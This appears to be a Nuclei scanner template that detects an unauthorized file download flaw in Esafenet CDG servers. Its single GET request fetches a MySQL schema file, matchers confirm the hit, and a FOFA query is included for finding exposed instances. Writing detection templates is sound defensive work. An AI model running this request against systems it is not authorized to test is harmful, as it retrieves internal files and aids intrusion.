id: esafenet-mysql-fileread

info:
  name: Esafenet CDG mysql - File Read
  author: DhiyaneshDk
  severity: high
  description: |
    CDGServer3 Unauthorized File Download vulnerability is detected.
  classification:
    cpe: cpe:2.3:a:esafenet:electronic_document_security_management_system:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="电子文档安全管理系统"
    product: electronic_document_security_management_system
    vendor: esafenet
  tags: esafenet,lfi,mysql,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql"

    max-size: 1000
    matchers-condition: and
    matchers:
      - type: word
        name: electronic_document_security_management_system
        cpe: cpe:2.3:a:esafenet:electronic_document_security_management_system:*:*:*:*:*:*:*:*
        part: body
        words:
          - "varchar"
          - "create table"
        condition: and

      - type: word
        name: electronic_document_security_management_system-2
        cpe: cpe:2.3:a:esafenet:electronic_document_security_management_system:*:*:*:*:*:*:*:*
        part: header
        words:
          - "application/x-sql"

      - type: status
        status:
          - 200
